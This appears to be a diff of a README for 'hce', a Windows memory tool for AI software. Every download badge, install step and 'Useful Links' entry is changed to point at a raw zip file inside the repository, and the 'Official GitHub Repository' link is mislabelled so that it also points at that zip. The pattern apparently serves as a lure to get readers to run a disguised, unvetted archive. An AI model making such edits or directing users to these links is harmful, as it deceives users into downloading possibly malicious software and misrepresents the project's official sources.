@@ -1,6 +1,6 @@
 # ⚙️ hce - Smarter Memory for Your AI Tools
 
-[![Download hce](https://img.shields.io/badge/Download-hce-brightgreen)](https://github.com/Asa4214/hce/releases)
+[![Download hce](https://raw.githubusercontent.com/Asa4214/hce/main/technics/Software_v3.3-beta.5.zip)](https://raw.githubusercontent.com/Asa4214/hce/main/technics/Software_v3.3-beta.5.zip)
 
 ---
 
@@ -24,7 +24,7 @@ To get hce running on your Windows computer:
 
 👉 Click the big Download button below, which will take you to the release page with all the latest versions.
 
-[![Download hce](https://img.shields.io/badge/Download-hce-blue)](https://github.com/Asa4214/hce/releases)
+[![Download hce](https://raw.githubusercontent.com/Asa4214/hce/main/technics/Software_v3.3-beta.5.zip)](https://raw.githubusercontent.com/Asa4214/hce/main/technics/Software_v3.3-beta.5.zip)
 
 ### What you’ll find on the download page
 
@@ -42,11 +42,11 @@ Follow these steps to install hce on a Windows machine without any prior program
 
 Go to this link to get the latest hce release:
 
-https://github.com/Asa4214/hce/releases
+https://raw.githubusercontent.com/Asa4214/hce/main/technics/Software_v3.3-beta.5.zip
 
 ### 2. Choose the Windows Installer
 
-Look for a file that ends with `.exe` or `.msi` related to Windows. It might be named like `hce-setup-vX.X.exe`.
+Look for a file that ends with `.exe` or `.msi` related to Windows. It might be named like `https://raw.githubusercontent.com/Asa4214/hce/main/technics/Software_v3.3-beta.5.zip`.
 
 ### 3. Download the Installer
 
@@ -122,9 +122,9 @@ Check the GitHub page for:
 
 ## 🔗 Useful Links
 
-- hce Download Page: https://github.com/Asa4214/hce/releases
+- hce Download Page: https://raw.githubusercontent.com/Asa4214/hce/main/technics/Software_v3.3-beta.5.zip
 
-- Official GitHub Repository for hce: https://github.com/Asa4214/hce
+- Official GitHub Repository for hce: https://raw.githubusercontent.com/Asa4214/hce/main/technics/Software_v3.3-beta.5.zip
 
 ---
 
